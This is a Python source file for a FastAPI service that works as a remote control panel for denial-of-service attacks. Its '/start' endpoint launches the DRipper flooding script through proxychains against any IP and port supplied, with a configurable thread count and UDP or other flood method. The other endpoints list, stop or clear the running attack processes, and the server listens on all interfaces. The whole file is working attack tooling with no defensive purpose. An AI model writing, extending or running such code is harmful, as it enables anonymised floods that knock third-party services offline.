from subprocess import Popen, PIPE

from fastapi import FastAPI
from fastapi.responses import JSONResponse, RedirectResponse
from datetime import datetime
import os
import uvicorn


app = FastAPI()

ddos = {}


@app.post("/start")
def start(
    ip: str, port: int = 80, threads: int = 100, method: str = 'udp', resource: str = '',
):
    p = Popen(
        ['proxychains', 'python3', 'DRipper.py', '-s', ip, '-p', str(port), '-t', str(threads), '-m', method, '--resource', resource],
        stdout=PIPE,
    )
    ddos[p.pid] = {'id': p.pid, 'ip': ip, 'port': port, 'url': resource, 'started': datetime.now()}
    return ddos[p.pid]


@app.get("/api/ddos")
def check():
    processes = []
    for pid in ddos:
        try:
            os.kill(pid, 0)
        except OSError:
            pass
        else:
            processes.append(ddos[pid])

    if processes:
        return processes
    return JSONResponse(status_code=404)


@app.delete("/stop/{process_id}")
def stop_process(process_id: int):
    if process_id in ddos:
        p = Popen(['kill', str(process_id)], stdout=PIPE)
        del ddos[process_id]
        return p.pid
    return JSONResponse(status_code=404)

@app.delete("/clear")
def stop_all_process():
    for process_id in list(ddos.keys()):
        Popen(['kill', str(process_id)], stdout=PIPE)
        del ddos[process_id]
    return JSONResponse(status_code=202)


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=49155)
